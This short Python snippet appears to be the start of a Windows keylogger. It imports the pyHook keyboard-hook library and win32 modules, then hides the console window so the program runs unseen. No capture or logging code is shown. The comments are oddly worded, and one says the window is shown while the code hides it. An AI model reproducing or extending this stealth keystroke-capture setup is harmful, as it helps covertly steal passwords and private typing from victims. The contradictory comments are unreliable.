

#Walk to the library, obtain the books to create the Python application.

import win32api
import win32console
import win32gui
import pythoncom, pyHook #<---Is the class library for the keyboard.

#Show the Console window the screen. 
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)


